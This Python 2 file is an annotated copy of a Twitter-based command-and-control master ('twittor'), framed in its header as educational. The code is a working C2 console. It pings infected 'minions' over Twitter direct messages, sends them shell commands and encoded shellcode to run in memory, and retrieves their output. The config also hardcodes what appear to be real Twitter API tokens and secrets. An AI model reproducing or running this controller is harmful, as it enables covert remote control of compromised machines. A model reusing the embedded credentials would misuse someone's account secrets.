#!/usr/bin/env python

"""
    An idea from Professor Viviek of SPSE, project referenced from: 
    www.github.com/PaulSEc/twittor/

    Basically a heavy annoted version of twittor.py of the above project for eductional purposes,
    and added a few new personal additions:
        1. ecapsulated main function better
    
    Things to improve on: 
        1. better error handling for minion error outputs


"""


# importing modules
import tweepy                       # twittor api
import base64                       # for encoding purpose (so data can be safely sent via web)           
import json                         # for json formatter
import random                       # for generating random chars for jobid 
import string                       # for string operations
import time                         # for time operations
import sys                          # for system implementations


##################################################################################################################################################
# globals
__CONFIG__ = {                                                                          # config object, could be encap into its own config file
                "consumer_token":"6VCDNZmaT2eXzquqWsGQhPfsn",
                "consumer_secret":"b0NjQJIJnBWsAq2UDwSatiYsjlYb873GBKwTfKb0h9QNCmuToI",
                "access_token":"1000867362034171904-UKXZqtyPb0271lpN9Jx8USXCUCOdJL",
                "access_token_secret":"oeSfY02Xk6lOyd9vl1Kw9W0OZhDjCYO1LILazrblK6itK",
                "username":"rennnitbaby"
            }

__MINIONS__ = []
__COMMANDS__ = []
__API__ = None

#################################################################################################################################################
# class definitions

## Exception handling
class TwittorException(Exception):
    """
        superClass: Exception class
        Base exception of this program
   
    """
    def __init__(self, message, error):
        Exception.__init__(self, message)
        self.error = error

#------------------------------------------------------------------------------------------------------------------------------------------------
class DecodingException(TwittorException):
    """
        superClass: TwittorException
        exception handler for decode failsures

    """
    pass
#------------------------------------------------------------------------------------------------------------------------------------------------
class CommandOutput:
    """
        superClass: None
        handler class that controls command outputs from minions
    
    """
    
    def __init__(self, message):
        """
            param1 obj: self object
            param2 string: json and encoded message from minion
            return obj: CommandOutput class object
        
        """
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.output = data['output']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except Exception as e:
            raise DecodingException("Error decoding message sent from minion %s" %message, e)
    
    def get_jobid(self):
        """
            param1 obj: self object
            return string: jobid of the commandoutput from minion
        
        """
        return self.jobid

    def get_sender(self):
        """
            param1 obj: self object
            return string: the sender of the output aka minion mac 
        
        """
        return self.sender

    def get_receiver(self):
        """
            param1 obj: self object
            return string: the receiver of the output, aka master

        """
        return self.receiver

    def get_cmd(self):
        """
            param1 obj: self object
            return string: command used in the minion
        
        """
        return self.cmd

    def get_output(self):
        """
            param1 obj: self object
            return string: the output of the command executed in minion 
        
        """
        return self.output

#-------------------------------------------------------------------------------------------------------------------------------------------------
class CommandToSend:
    """
        superClass: None
        handler class that controls the command to be sent to minions
    
    
    """
    
    def __init__(self, sender, receiver, cmd):
        """
            param1 obj: self object
            param2 string: the sender of the cmd aka master
            param3 string: the receiver of the cmd aka minion
            param4 string: the command to be sent to minions
            return obj: CommandToSend class object
        
        """
        self.sender = sender
        self.receiver = receiver
        self.cmd = cmd
        self.jobid = ''.join(random.sample(string.ascii_letters + string.digits, 7))

    def build(self):
        """
            param1 obj: self object
            return string: encoded json object of the command to be sent to minion 
        
        """
        cmd = {
                "sender": self.sender,
                "receiver": self.receiver,
                "cmd": self.cmd,
                "jobid": self.jobid
                }

        return base64.b64encode(json.dumps(cmd))
    
    def get_jobid(self):
        """
            param1 obj: self object
            return string: the jobid of the current command to be sent to minion
        
        """
        return self.jobid

##################################################################################################################################################
# function definitions
def main():
    """
        params: None
        return effect: continous loop to collect master's input and execute them on remote machines
    
    """
    twitter_handler()                                                                       # api handler

    refresh()                                                                               # refreshing minion and command list

    while True:                                                                             # infinite loop until we exit
        input_handler()

#-------------------------------------------------------------------------------------------------------------------------------------------------
def twitter_handler():                                                                      # authenticate twitter
    """
        params: None
        return effect: sets up twitter api using tweepy
    
    """
    global __API__
    global __CONFIG__
    
    auth = tweepy.OAuthHandler(__CONFIG__['consumer_token'], __CONFIG__['consumer_secret']) # setting up consumer tokens/secrets
    auth.set_access_token(__CONFIG__['access_token'], __CONFIG__['access_token_secret'])    # setting up access tokens/secretes

    __API__ = tweepy.API(auth)                                                              # setting global __API__

#-------------------------------------------------------------------------------------------------------------------------------------------------
def input_handler():
    """
        params: None
        return effect: collecting master's input, and calling appropriate functions/classes
    
    """
    cmd_to_launch = raw_input('$ ')                                 # input receiver
    
    if cmd_to_launch == 'refresh':                                  # if command is refresh
        refresh()                                                   # call refresh
    elif cmd_to_launch == 'list_minions':                           # if command is list_minions
        list_minions()                                              # call list_minions
    elif cmd_to_launch == 'list_commands':                          # if command is list_commands
        list_commands()                                             # call list_commands
    elif cmd_to_launch == 'help':                                   # if command is help
        usage()                                                     # call usage
    elif cmd_to_launch == 'exit':                                   # if command is exit
        print "[!] Exiting..."  
        sys.exit(0)                                                 # we exit with success status
    else:
        cmd_to_launch = cmd_to_launch.split(' ')                    # if there is more than one arg to the command
        if cmd_to_launch[0] == '!cmd':                              # and first command is !cmd, meaning we are executing bash to mac
            mac = cmd_to_launch[1]                                  # extracting mac
            command = cmd_to_launch[2:]                             # extracting series of commands, will be in list format sent to minion
            cmd = CommandToSend('master', mac, command)             # CommandToSend object with all params needed
            __API__.send_direct_message(user=__CONFIG__['username'], text=cmd.build())          # sending command thru twitter api
            print '[+] Sent command %s with jobid: %s' %(' '.join(command), cmd.get_jobid())    # stdo confirmation
        elif cmd_to_launch[0] == '!shellcode':                                                  # if we dealing with shellcode
            mac = cmd_to_launch[1]                                                              # extracting mac
            command = 'shellcode %s' % base64.b64encode(cmd_to_launch[2])                       # exacting command/shellcode and encoding it
            cmd = CommandToSend('master', mac, command)                                         # CommandToSend object with all params needed
            __API__.send_direct_message(user=__CONFIG__['username'], text=cmd.build())          # sending shellcode thru twitter api as str
            print '[+] Sent shellcode with jobid %s' %(cmd.get_jobid())                         # stdo confirmation
        elif cmd_to_launch[0] == '!retrieve':                                                   # if command is !retrieve
            retrieve_command(cmd_to_launch[1])                                                  # calling retrieve_command
        else:           
            print '[!] Unrecognized command'                                                    # at last, if we dont recognize command

#-------------------------------------------------------------------------------------------------------------------------------------------------
def refresh(refresh_minions=True):
    """
        param bool: refresh_minion list defaulted to be True
        return effect: broadcasts ping too all minions and lists them by default  
    
    """
    global __MINIONS__                                                                  # global variables we need
    global __COMMANDS__

    if refresh_minions:                                                                 # if we are refreshing minions
        __MINIONS__ = []                                                                # clearing __MINIONS__ list

        print "[+] Sending command to retrieve active minions"                          # stdo confirmation
        cmd = CommandToSend("master", "test123", "PING")                                # preparing to send PING using api
        jobid = cmd.get_jobid()                                                         # grabbing ping jobid for check later

        __API__.send_direct_message(user=__CONFIG__["username"], text=cmd.build())      # ping sent using api

        print "[+] Waiting for minion response, timeout=10s.."  
        time.sleep(10)                                                                  # waiting for 10 secs for response

    for message in __API__.direct_messages(count=200, full_text="true"):                # now we are grabbing 200 DM records 
        if message.sender_screen_name == __CONFIG__['username']:                        # if sender is master
            try:
                message = CommandOutput(message.text)                                   # decoding the output from minions

                if refresh_minions and message.get_jobid() == jobid:                    # if the same jobid as set with ping
                    __MINIONS__.append(message)                                         # we will append minion to the list
                else:                                                                   # if this is not a ping response
                    __COMMANDS__.append(message)                                        # appending it to the commands list
            except:                                                                     # pass on all exceptions for continual execution
                pass

    if refresh_minions:                                                                 # and at last, if we have refresh_minions
        list_minions()                                                                  # we will  list all minions
#-------------------------------------------------------------------------------------------------------------------------------------------------
def list_minions():
    """
        params: None
        return effect: lists the current active minions on network
    
    """
    if len(__MINIONS__) == 0:
        print "[+] No active minions"
        return
    for minion in __MINIONS__:
        print "%s:%s" %(minion.get_sender(), minion.get_output())
#-------------------------------------------------------------------------------------------------------------------------------------------------
def list_commands():
    """
        params: None
        return effect: lists all current command executed on minions
    
    """
    if len(__COMMANDS__) == 0:
        print '[+] No commands loaded'
        return
    for command in __COMMANDS__:
        print "%s: %s on %s " % (command.get_jobid(), command.get_cmd(), command.get_sender())

#-------------------------------------------------------------------------------------------------------------------------------------------------
def retrieve_command(cmd_id):
    """
        param1 string: the jobid of the command we have executed
        return effect: the output of the command we have executed on remote minion
    
    """
    global __COMMANDS__

    # retrieve the command outputs without refreshing minion list
    refresh(False)
    for command in __COMMANDS__:
        if command.get_jobid() == cmd_id:
            print "%s : %s" % (command.get_jobid(), command.get_output())
            return
    print "[+] Did not manage the retrieve command output"

#-------------------------------------------------------------------------------------------------------------------------------------------------
def usage():
    """
        params: None
        return effect: outputs the usage statment and all of the commands for this C&C
    
    """
    print """

    refresh                            -- refresh C&C control
    list_minions                       -- list active minions
    list_commands                      -- list executed commands
    !retrieve <jobid>                  -- retrieve command from jobid
    !cmd <MAC ADDRESS> command         -- execute the command on minion given its mac
    !shellcode <MAC ADDRESS> shellcode -- load and execute shellcode in memory (make sure payload is compatible with minion platform)
    help                               -- print this page
    exit                               -- exit C&C control
    
    """

##################################################################################################################################################
# script execution
if __name__ == "__main__":
    main()
